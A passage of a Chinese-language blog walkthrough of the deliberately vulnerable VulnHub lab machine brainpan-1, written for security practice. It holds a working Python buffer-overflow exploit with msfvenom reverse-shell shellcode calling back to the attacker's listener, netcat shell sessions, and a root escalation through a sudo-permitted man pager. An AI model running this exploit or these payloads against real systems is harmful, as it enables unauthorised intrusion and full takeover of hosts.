class="string">&quot;\x80\x57\x31\xd6\xfc\xc7\xbe\x0d\x45\xf7\xf4\x0f\xec&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x90\x50\xda\xac\xfc\x62\x31\xf2\xf8\xe0\xb3\x8b\xfe&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\xf9\xb6\x8e\xbb\xbd\x2b\xe3\xd4\x2b\x4b\x50\xd4\x79&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>
+
+<p>启动brainpan.exe程序，在端口443上创建netcat侦听器，然后测试一下PoC代码。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;python etfuzz.py</span><br><span class="line">[-] Connecting to 192.168.43.98</span><br><span class="line">[-] Sending payload....  Done</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.1: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.1] 18602</span><br><span class="line">Microsoft Windows [�汾 10.0.18363.592]</span><br><span class="line">(c) 2019 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;chcp 65001</span><br><span class="line">chcp 65001</span><br><span class="line">Active code page: 65001</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;<span class="built_in">whoami</span>  </span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">iz94tylsq69z\hasee</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;<span class="built_in">dir</span></span><br><span class="line"><span class="built_in">dir</span></span><br><span class="line"> Volume <span class="keyword">in</span> drive C has no label.</span><br><span class="line"> Volume Serial Number is 7A49-F084</span><br><span class="line"></span><br><span class="line"> Directory of C:\Users\HASEE\Desktop\brainpan1</span><br><span class="line"></span><br><span class="line">2020/02/01  01:21    &lt;DIR&gt;          .</span><br><span class="line">2020/02/01  01:21    &lt;DIR&gt;          ..</span><br><span class="line">2020/01/31  20:48            21,190 brainpan.exe</span><br><span class="line">2020/02/01  01:21             2,166 etfuzz.py</span><br><span class="line">               2 File(s)         23,356 bytes</span><br><span class="line">               2 Dir(s)  151,135,014,912 bytes free</span><br><span class="line"></span><br><span class="line">C:\Users\HASEE\Desktop\brainpan1&gt;net user</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">User accounts <span class="keyword">for</span> \\IZ94TYLSQ69Z</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            ASPNET                   DefaultAccount           </span><br><span class="line">Guest                    HASEE                    WDAGUtilityAccount </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意：这个shell是测试电脑的shell，如果乱码，输入chcp 65001就不会乱码了</li>
+</ul>
+<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>好东西…。现在有一个reverse TCP连接到我们的Windows计算机。是时候创建一个Linux reverse shell了。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 R -e x86/alpha_upper -b &#x27;\x00&#x27; -f python</span></span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x86 from the payload</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86/alpha_upper</span><br><span class="line">x86/alpha_upper succeeded with size 205 (iteration=0)</span><br><span class="line">x86/alpha_upper chosen with final size 205</span><br><span class="line">Payload size: 205 bytes</span><br><span class="line">Final size of python file: 1007 bytes</span><br><span class="line">buf =  b<span class="string">&quot;&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import sys,socket</span><br><span class="line"> </span><br><span class="line">victim = <span class="string">&#x27;192.168.56.115&#x27;</span></span><br><span class="line">port = 9999</span><br><span class="line"> </span><br><span class="line">junk = <span class="string">&quot;\x41&quot;</span> * 524</span><br><span class="line">eip = <span class="string">&quot;\xf3\x12\x17\x31&quot;</span></span><br><span class="line">buf =  b<span class="string">&quot;\x90&quot;</span> * 13</span><br><span class="line">buf += b<span class="string">&quot;\x89\xe5\xd9\xcb\xd9\x75\xf4\x58\x50\x59\x49\x49\x49&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4a\x49\x30\x31\x49\x4b\x5a\x57\x4b\x53\x31\x43\x47&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x33\x46\x33\x53\x5a\x53\x32\x4b\x39\x4b\x51\x38\x30&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x52\x46\x58\x4d\x4d\x50\x4a\x33\x36\x39\x48\x30\x37&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x4f\x58\x4d\x4d\x50\x30\x49\x44\x39\x5a\x59\x35\x38&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x49\x50\x59\x38\x30\x38\x45\x36\x32\x48\x44\x42\x33&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x30\x35\x51\x4f\x4b\x4b\x39\x4b\x51\x38\x30\x42\x46&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x56\x30\x36\x31\x30\x53\x4f\x43\x33\x33\x4c\x49\x4b&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x51\x38\x4d\x4d\x50\x50\x52\x43\x58\x52\x4e\x46\x4f&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x44\x33\x52\x48\x53\x58\x36\x4f\x46\x4f\x32\x42\x53&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x59\x4d\x59\x4a\x43\x31\x42\x31\x43\x4c\x49\x4d\x31&quot;</span></span><br><span class="line">buf += b<span class="string">&quot;\x38\x30\x34\x4b\x58\x4d\x4b\x30\x41\x41&quot;</span></span><br><span class="line"> </span><br><span class="line">payload = junk + eip + buf</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">try:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Connecting to &quot;</span> + str(victim)</span><br><span class="line">  s.connect((victim, port))</span><br><span class="line">  s.recv(1024)</span><br><span class="line"> </span><br><span class="line">  <span class="comment"># Send payload </span></span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Sending payload.... &quot;</span>,</span><br><span class="line">  s.send(payload)</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;Done&quot;</span></span><br><span class="line"> </span><br><span class="line">except:</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&quot;[-] Unable to connect to &quot;</span> + str(victim)</span><br><span class="line">  sys.exit(0)</span><br></pre></td></tr></table></figure>
+
+<p>使用受害者主机的IP地址和更新的Shellcode更新PoC脚本，在端口443上创建一个新的netcat侦听器，并相应地执行，成功的返回了shell。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 443</span></span><br><span class="line">listening on [any] 443 ...</span><br><span class="line">192.168.56.115: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.115] 39737</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1002(puck) gid=1002(puck) <span class="built_in">groups</span>=1002(puck)</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">puck@brainpan:/home/puck$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1002(puck) gid=1002(puck) <span class="built_in">groups</span>=1002(puck)</span><br><span class="line">puck@brainpan:/home/puck$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">puck</span><br><span class="line">puck@brainpan:/home/puck$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">checksrv.sh  web</span><br><span class="line">puck@brainpan:/home/puck$</span><br></pre></td></tr></table></figure>
+
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>成功！现在，受害者计算机上有一个特权低的shell。继续。查看主目录，看是否有有趣的事情……。不。唯一值得注意的是，有一个脚本可以在死时重新启动Web服务，以及在端口10000上运行的Web服务的根目录。sudo可以使用任何特殊权限吗？</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> puck on this host:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User puck may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: /home/anansi/bin/anansi_util</span><br></pre></td></tr></table></figure>
+
+<p>anansi_util NOPASSWD？很有趣。仔细看看。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util</span><br><span class="line">sudo /home/anansi/bin/anansi_util</span><br><span class="line">Usage: /home/anansi/bin/anansi_util [action]</span><br><span class="line">Where [action] is one of:</span><br><span class="line">  - network</span><br><span class="line">  - proclist</span><br><span class="line">  - manual [<span class="built_in">command</span>]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>manual [command]部分。看看是否可以使用root特权运行[command]。</li>
+</ul>
+<p>成功的提权并找到了flag，吊炸天！！！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">puck@brainpan:/home$ sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">sudo /home/anansi/bin/anansi_util manual /bin/bash</span><br><span class="line">/usr/bin/man: manual-/bin/bash: No such file or directory</span><br><span class="line">/usr/bin/man: manual_/bin/bash: No such file or directory</span><br><span class="line">No manual entry <span class="keyword">for</span> manual</span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">-  (press RETURN)</span><br><span class="line">BASH(1)                                                                BASH(1)</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       bash - GNU Bourne-Again SHell</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       bash [options] [file]</span><br><span class="line"></span><br><span class="line">COPYRIGHT</span><br><span class="line">       Bash is Copyright (C) 1989-2011 by the Free Software Foundation, Inc.</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       Bash  is  an  sh-compatible  <span class="built_in">command</span> language interpreter that executes</span><br><span class="line">       commands <span class="built_in">read</span> from the standard input or from a file.  Bash also incor‐</span><br><span class="line">       porates useful features from the Korn and C shells (ksh and csh).</span><br><span class="line"></span><br><span class="line">       Bash  is  intended  to  be a conformant implementation of the Shell and</span><br><span class="line">       Utilities portion  of  the  IEEE  POSIX  specification  (IEEE  Standard</span><br><span class="line">       1003.1).  Bash can be configured to be POSIX-conformant by default.</span><br><span class="line"></span><br><span class="line">OPTIONS</span><br><span class="line">       All  of  the  single-character shell options documented <span class="keyword">in</span> the descrip‐</span><br><span class="line">       tion of the <span class="built_in">set</span> <span class="built_in">builtin</span> <span class="built_in">command</span> can be used as options when  the  shell</span><br><span class="line"> Manual page bash(1) line 1 (press h <span class="keyword">for</span> <span class="built_in">help</span> or q to quit)!/bin/bash</span><br><span class="line">!/bin/bash</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line">root@brainpan:/usr/share/man<span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line">root@brainpan:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">b.txt</span><br><span class="line">root@brainpan:~<span class="comment"># cat b.txt</span></span><br><span class="line"><span class="built_in">cat</span> b.txt</span><br><span class="line">_|                            _|                                        </span><br><span class="line">_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  </span><br><span class="line">_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|</span><br><span class="line">_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|</span><br><span class="line">                                            _|                          </span><br><span class="line">                                            _|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                              http://www.techorganic.com </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@brainpan:~<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>W00T !!!!!root！二进制文件允许以root用户身份查询联机帮助页，因此，可以使用man的内置功能来内联运行命令，例如上述输出中的！&#x2F;bin&#x2F;bash。</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub198.jpg"></p>
+<h4 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h4><ul>
+<li>缓冲区溢出</li>
+<li>od调试程序</li>
+<li>python模糊测试脚本测试段错误</li>
+<li>msf脚本生成填充缓冲区的字节</li>
+<li>msfvenom生成reverse shell的python shellcode版本的代码</li>
+<li>覆盖eip将恶意shellcode代码放入esp取得reverseshell</li>
+<li>man内置功能内联运行命令提权</li>
+</ul>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/01/26/brainpan-1/" title="vulnhub靶机渗透[brainpan-1]">https://fdlucifer.github.io/2020/01/26/brainpan-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/01/24/Lord-Of-The-Root-1-0-1/" rel="prev" title="vulnhub靶机渗透[Lord-Of-The-Root-1-0-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[Lord-Of-The-Root-1-0-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/02/01/brainpan2/" rel="next" title="vulnhub靶机渗透[brainpan2]">
+                  vulnhub靶机渗透[brainpan2] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
